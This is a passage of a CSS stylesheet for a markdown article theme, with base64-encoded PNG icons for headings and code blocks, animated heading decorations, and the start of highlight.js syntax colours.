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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 